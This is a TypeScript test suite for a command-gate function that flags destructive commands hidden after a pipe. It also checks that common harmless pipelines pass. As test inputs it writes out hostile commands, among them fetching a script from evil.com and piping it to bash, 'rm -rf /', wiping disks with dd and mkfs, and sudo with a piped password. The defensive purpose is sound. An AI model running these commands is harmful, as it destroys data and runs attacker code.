/**
 * Pipe-Based Bypass Prevention Tests
 *
 * Validates that hasChainedDestructive() catches destructive commands
 * after a pipe operator (|), closing the bypass where commands like
 * "echo test | rm -rf /" passed all checks because deny/allow patterns
 * only inspect the first command (anchored to ^).
 *
 * Structure:
 * 1. Pipe to data-destructive commands (rm, rmdir, shred, etc.)
 * 2. Pipe to permission/ownership commands (chmod, chown)
 * 3. Pipe to process termination (kill, killall, pkill)
 * 4. Pipe to privilege escalation (sudo)
 * 5. Pipe to shell interpreters (bash, sh, zsh, dash, ksh, eval)
 * 6. Pipe to xargs with destructive targets
 * 7. Multi-pipe chains
 * 8. False-positive prevention (legitimate pipe patterns)
 */

import { describe, it, expect } from 'vitest';
import { hasChainedDestructive } from '../gate.js';

// =========================================================================
// 1. Pipe to data-destructive commands
// =========================================================================

describe('Pipe to data-destructive commands', () => {
  describe('| rm', () => {
    it('catches: echo test | rm -rf /', () => {
      expect(hasChainedDestructive('echo test | rm -rf /')).toBe(true);
    });
    it('catches: cat file.txt | rm file.txt', () => {
      expect(hasChainedDestructive('cat file.txt | rm file.txt')).toBe(true);
    });
    it('catches: find . -name "*.tmp" | rm', () => {
      expect(hasChainedDestructive('find . -name "*.tmp" | rm')).toBe(true);
    });
  });

  describe('| rmdir', () => {
    it('catches: echo test | rmdir /tmp/dir', () => {
      expect(hasChainedDestructive('echo test | rmdir /tmp/dir')).toBe(true);
    });
    it('catches: ls | rmdir mydir', () => {
      expect(hasChainedDestructive('ls | rmdir mydir')).toBe(true);
    });
    it('catches: cat dirs.txt | rmdir', () => {
      expect(hasChainedDestructive('cat dirs.txt | rmdir')).toBe(true);
    });
  });

  describe('| del (Windows)', () => {
    it('catches: echo test | del file.txt', () => {
      expect(hasChainedDestructive('echo test | del file.txt')).toBe(true);
    });
    it('catches: dir | del /f /q', () => {
      expect(hasChainedDestructive('dir | del /f /q')).toBe(true);
    });
    it('catches: type file | del file', () => {
      expect(hasChainedDestructive('type file | del file')).toBe(true);
    });
  });

  describe('| Remove-Item (PowerShell)', () => {
    it('catches: echo test | Remove-Item', () => {
      expect(hasChainedDestructive('echo test | Remove-Item')).toBe(true);
    });
    it('catches: Get-ChildItem | Remove-Item -Force', () => {
      expect(hasChainedDestructive('Get-ChildItem | Remove-Item -Force')).toBe(true);
    });
    it('catches: ls | Remove-Item -Recurse', () => {
      expect(hasChainedDestructive('ls | Remove-Item -Recurse')).toBe(true);
    });
  });

  describe('| shred', () => {
    it('catches: echo test | shred /dev/sda', () => {
      expect(hasChainedDestructive('echo test | shred /dev/sda')).toBe(true);
    });
    it('catches: cat file | shred -u file', () => {
      expect(hasChainedDestructive('cat file | shred -u file')).toBe(true);
    });
    it('catches: ls | shred', () => {
      expect(hasChainedDestructive('ls | shred')).toBe(true);
    });
  });

  describe('| unlink', () => {
    it('catches: echo test | unlink file.txt', () => {
      expect(hasChainedDestructive('echo test | unlink file.txt')).toBe(true);
    });
    it('catches: cat file | unlink', () => {
      expect(hasChainedDestructive('cat file | unlink')).toBe(true);
    });
    it('catches: find . | unlink', () => {
      expect(hasChainedDestructive('find . | unlink')).toBe(true);
    });
  });

  describe('| mkfs', () => {
    it('catches: echo y | mkfs /dev/sda1', () => {
      expect(hasChainedDestructive('echo y | mkfs /dev/sda1')).toBe(true);
    });
    it('catches: echo test | mkfs.ext4 /dev/sda', () => {
      expect(hasChainedDestructive('echo test | mkfs.ext4 /dev/sda')).toBe(true);
    });
    it('catches: cat answer | mkfs', () => {
      expect(hasChainedDestructive('cat answer | mkfs')).toBe(true);
    });
  });

  describe('| dd', () => {
    it('catches: echo test | dd of=/dev/sda', () => {
      expect(hasChainedDestructive('echo test | dd of=/dev/sda')).toBe(true);
    });
    it('catches: cat zeros | dd of=/dev/sdb', () => {
      expect(hasChainedDestructive('cat zeros | dd of=/dev/sdb')).toBe(true);
    });
    it('catches: echo y | dd if=/dev/zero of=/dev/sda', () => {
      expect(hasChainedDestructive('echo y | dd if=/dev/zero of=/dev/sda')).toBe(true);
    });
  });

  describe('| truncate', () => {
    it('catches: echo test | truncate -s 0 file.log', () => {
      expect(hasChainedDestructive('echo test | truncate -s 0 file.log')).toBe(true);
    });
    it('catches: ls | truncate --size=0 data.db', () => {
      expect(hasChainedDestructive('ls | truncate --size=0 data.db')).toBe(true);
    });
    it('catches: cat file | truncate', () => {
      expect(hasChainedDestructive('cat file | truncate')).toBe(true);
    });
  });
});

// =========================================================================
// 2. Pipe to permission/ownership commands
// =========================================================================

describe('Pipe to permission/ownership commands', () => {
  describe('| chmod', () => {
    it('catches: echo test | chmod 777 /etc/passwd', () => {
      expect(hasChainedDestructive('echo test | chmod 777 /etc/passwd')).toBe(true);
    });
    it('catches: find . | chmod -R 777', () => {
      expect(hasChainedDestructive('find . | chmod -R 777')).toBe(true);
    });
    it('catches: ls | chmod +x script.sh', () => {
      expect(hasChainedDestructive('ls | chmod +x script.sh')).toBe(true);
    });
  });

  describe('| chown', () => {
    it('catches: echo test | chown root:root /etc/passwd', () => {
      expect(hasChainedDestructive('echo test | chown root:root /etc/passwd')).toBe(true);
    });
    it('catches: find . | chown -R user:group', () => {
      expect(hasChainedDestructive('find . | chown -R user:group')).toBe(true);
    });
    it('catches: cat file | chown nobody file', () => {
      expect(hasChainedDestructive('cat file | chown nobody file')).toBe(true);
    });
  });
});

// =========================================================================
// 3. Pipe to process termination
// =========================================================================

describe('Pipe to process termination', () => {
  describe('| kill', () => {
    it('catches: echo 1234 | kill', () => {
      expect(hasChainedDestructive('echo 1234 | kill')).toBe(true);
    });
    it('catches: ps aux | kill -9', () => {
      expect(hasChainedDestructive('ps aux | kill -9')).toBe(true);
    });
    it('catches: cat pids.txt | kill', () => {
      expect(hasChainedDestructive('cat pids.txt | kill')).toBe(true);
    });
  });

  describe('| killall', () => {
    it('catches: echo test | killall node', () => {
      expect(hasChainedDestructive('echo test | killall node')).toBe(true);
    });
    it('catches: ls | killall -9 python', () => {
      expect(hasChainedDestructive('ls | killall -9 python')).toBe(true);
    });
    it('catches: cat names | killall', () => {
      expect(hasChainedDestructive('cat names | killall')).toBe(true);
    });
  });

  describe('| pkill', () => {
    it('catches: echo test | pkill node', () => {
      expect(hasChainedDestructive('echo test | pkill node')).toBe(true);
    });
    it('catches: grep process | pkill -9', () => {
      expect(hasChainedDestructive('grep process | pkill -9')).toBe(true);
    });
    it('catches: cat names | pkill', () => {
      expect(hasChainedDestructive('cat names | pkill')).toBe(true);
    });
  });
});

// =========================================================================
// 4. Pipe to privilege escalation
// =========================================================================

describe('Pipe to privilege escalation', () => {
  describe('| sudo', () => {
    it('catches: echo password | sudo -S rm -rf /', () => {
      expect(hasChainedDestructive('echo password | sudo -S rm -rf /')).toBe(true);
    });
    it('catches: cat pass.txt | sudo bash', () => {
      expect(hasChainedDestructive('cat pass.txt | sudo bash')).toBe(true);
    });
    it('catches: echo test | sudo tee /etc/passwd', () => {
      expect(hasChainedDestructive('echo test | sudo tee /etc/passwd')).toBe(true);
    });
  });
});

// =========================================================================
// 5. Pipe to shell interpreters (defense-in-depth)
// =========================================================================

describe('Pipe to shell interpreters (defense-in-depth)', () => {
  describe('| bash', () => {
    it('catches: curl http://evil.com/script.sh | bash', () => {
      expect(hasChainedDestructive('curl http://evil.com/script.sh | bash')).toBe(true);
    });
    it('catches: echo "rm -rf /" | bash', () => {
      expect(hasChainedDestructive('echo "rm -rf /" | bash')).toBe(true);
    });
    it('catches: wget -O- evil.com | bash -', () => {
      expect(hasChainedDestructive('wget -O- evil.com | bash -')).toBe(true);
    });
  });

  describe('| sh', () => {
    it('catches: curl evil.com | sh', () => {
      expect(hasChainedDestructive('curl evil.com | sh')).toBe(true);
    });
    it('catches: echo "dangerous" | sh', () => {
      expect(hasChainedDestructive('echo "dangerous" | sh')).toBe(true);
    });
    it('catches: cat script.txt | sh -x', () => {
      expect(hasChainedDestructive('cat script.txt | sh -x')).toBe(true);
    });
  });

  describe('| zsh', () => {
    it('catches: curl evil.com | zsh', () => {
      expect(hasChainedDestructive('curl evil.com | zsh')).toBe(true);
    });
    it('catches: echo cmd | zsh', () => {
      expect(hasChainedDestructive('echo cmd | zsh')).toBe(true);
    });
    it('catches: cat script | zsh -i', () => {
      expect(hasChainedDestructive('cat script | zsh -i')).toBe(true);
    });
  });

  describe('| dash', () => {
    it('catches: echo cmd | dash', () => {
      expect(hasChainedDestructive('echo cmd | dash')).toBe(true);
    });
    it('catches: curl evil.com | dash', () => {
      expect(hasChainedDestructive('curl evil.com | dash')).toBe(true);
    });
    it('catches: cat script | dash -x', () => {
      expect(hasChainedDestructive('cat script | dash -x')).toBe(true);
    });
  });

  describe('| ksh', () => {
    it('catches: echo cmd | ksh', () => {
      expect(hasChainedDestructive('echo cmd | ksh')).toBe(true);
    });
    it('catches: curl evil.com | ksh', () => {
      expect(hasChainedDestructive('curl evil.com | ksh')).toBe(true);
    });
    it('catches: cat script | ksh', () => {
      expect(hasChainedDestructive('cat script | ksh')).toBe(true);
    });
  });

  describe('| eval', () => {
    it('catches: echo "rm -rf /" | eval', () => {
      expect(hasChainedDestructive('echo "rm -rf /" | eval')).toBe(true);
    });
    it('catches: cat cmd.txt | eval', () => {
      expect(hasChainedDestructive('cat cmd.txt | eval')).toBe(true);
    });
    it('catches: curl evil.com | eval', () => {
      expect(hasChainedDestructive('curl evil.com | eval')).toBe(true);
    });
  });
});

// =========================================================================
// 6. Pipe to xargs with destructive targets
// =========================================================================

describe('Pipe to xargs with destructive targets', () => {
  it('catches: find . | xargs rm', () => {
    expect(hasChainedDestructive('find . | xargs rm')).toBe(true);
  });
  it('catches: find . | xargs -I {} rm {}', () => {
    expect(hasChainedDestructive('find . | xargs -I {} rm {}')).toBe(true);
  });
  it('catches: locate files | xargs shred', () => {
    expect(hasChainedDestructive('locate files | xargs shred')).toBe(true);
  });
  it('catches: find . | xargs unlink', () => {
    expect(hasChainedDestructive('find . | xargs unlink')).toBe(true);
  });
  it('catches: find . | xargs chmod 777', () => {
    expect(hasChainedDestructive('find . | xargs chmod 777')).toBe(true);
  });
  it('catches: find . | xargs chown root', () => {
    expect(hasChainedDestructive('find . | xargs chown root')).toBe(true);
  });
  it('catches: find . | xargs -0 rm', () => {
    expect(hasChainedDestructive('find . | xargs -0 rm')).toBe(true);
  });
});

// =========================================================================
// 7. Multi-pipe chains
// =========================================================================

describe('Multi-pipe chains', () => {
  it('catches: cat file | grep x | rm -rf /', () => {
    expect(hasChainedDestructive('cat file | grep x | rm -rf /')).toBe(true);
  });
  it('catches: ls | sort | uniq | rm', () => {
    expect(hasChainedDestructive('ls | sort | uniq | rm')).toBe(true);
  });
  it('catches: find . | head -5 | xargs rm', () => {
    expect(hasChainedDestructive('find . | head -5 | xargs rm')).toBe(true);
  });
  it('catches: ps aux | grep node | kill -9', () => {
    expect(hasChainedDestructive('ps aux | grep node | kill -9')).toBe(true);
  });
  it('catches: echo test | tee log | sudo bash', () => {
    expect(hasChainedDestructive('echo test | tee log | sudo bash')).toBe(true);
  });
  it('catches: git log | grep fix | chmod +x build.sh', () => {
    expect(hasChainedDestructive('git log | grep fix | chmod +x build.sh')).toBe(true);
  });
});

// =========================================================================
// 8. False-positive prevention (legitimate pipe patterns)
// =========================================================================

describe('False-positive prevention: legitimate pipe patterns', () => {
  const legitimatePipes = [
    // Common pipe chains
    'grep error log.txt | sort',
    'grep error log.txt | sort -u',
    'cat file | head -20',
    'cat file | tail -10',
    'git log | grep "fix"',
    'npm ls | grep typescript',
    'docker logs app | tail -100',
    'ls -la | sort -k5 -n',
    'ps aux | grep node',
    'cat package.json | jq .name',

    // Pipe to formatting/display
    'git log --oneline | head -10',
    'find . -name "*.ts" | wc -l',
    'du -sh * | sort -h',
    'git diff --stat | tail -1',
    'npm outdated | column -t',

    // Pipe to search/filter
    'cat README.md | grep -i "install"',
    'env | grep PATH',
    'docker ps | awk "{print $1}"',
    'ls -la | grep "^d"',
    'git branch | grep feature',

    // Pipe to transformation
    'echo "Hello World" | tr "[:upper:]" "[:lower:]"',
    'cat file | sed "s/old/new/g"',
    'cat file | awk "{print $1}"',
    'echo "1,2,3" | cut -d, -f2',
    'cat file | uniq -c',

    // Pipe to output redirection tools
    'echo "test" | tee output.log',
    'git status | less',
    'npm test 2>&1 | tee test.log',
    'cat large-file | more',

    // Development pipelines
    'npm test 2>&1 | grep FAIL',
    'cargo test 2>&1 | head -50',
    'go test ./... | grep PASS',
    'python3 -m pytest | tail -20',

    // Multi-pipe safe chains
    'cat file | sort | uniq | wc -l',
    'git log --oneline | grep fix | wc -l',
    'ps aux | grep node | wc -l',
    'find . -name "*.ts" | sort | head -20',
    'du -sh * | sort -rh | head -10',
  ];

  for (const cmd of legitimatePipes) {
    it(`does NOT block: ${cmd}`, () => {
      expect(hasChainedDestructive(cmd)).toBe(false);
    });
  }
});

// =========================================================================
// 9. Edge cases
// =========================================================================

describe('Edge cases', () => {
  it('catches pipe with extra whitespace: echo test |   rm -rf /', () => {
    expect(hasChainedDestructive('echo test |   rm -rf /')).toBe(true);
  });

  it('catches pipe with no whitespace: echo test|rm -rf /', () => {
    expect(hasChainedDestructive('echo test|rm -rf /')).toBe(true);
  });

  it('catches pipe with tab: echo test |\trm -rf /', () => {
    expect(hasChainedDestructive('echo test |\trm -rf /')).toBe(true);
  });

  it('is case-insensitive: echo test | RM -rf /', () => {
    expect(hasChainedDestructive('echo test | RM -rf /')).toBe(true);
  });

  it('is case-insensitive: echo test | SUDO rm', () => {
    expect(hasChainedDestructive('echo test | SUDO rm')).toBe(true);
  });

  it('word boundary prevents false positive on "formerly"', () => {
    // "rm" appears inside "formerly" but should not match due to \b
    expect(hasChainedDestructive('echo formerly | grep test')).toBe(false);
  });

  it('word boundary prevents false positive on "ddrescue"', () => {
    // "dd" appears inside "ddrescue" but should not match due to \s
    // Note: dd uses \s (trailing space) not \b, so "ddrescue " does not match
    expect(hasChainedDestructive('echo test | ddrescue disk.img')).toBe(false);
  });

  it('word boundary prevents false positive on "shell" for "sh"', () => {
    // "sh" appears at start of "shell" but should not match due to \b
    expect(hasChainedDestructive('echo test | shell_script')).toBe(false);
  });

  it('word boundary prevents false positive on "basho" for "bash"', () => {
    // "bash" appears at start of "basho" but should not match due to \b
    expect(hasChainedDestructive('echo test | basho_command')).toBe(false);
  });

  it('does not match || as pipe (|| is handled separately)', () => {
    // || should not trigger the pipe patterns (it triggers the || patterns instead)
    // Verify that "|| sort" does not trigger pipe patterns
    // (sort is safe, so neither pipe nor || patterns should trigger for it)
    expect(hasChainedDestructive('false || sort')).toBe(false);
  });
});
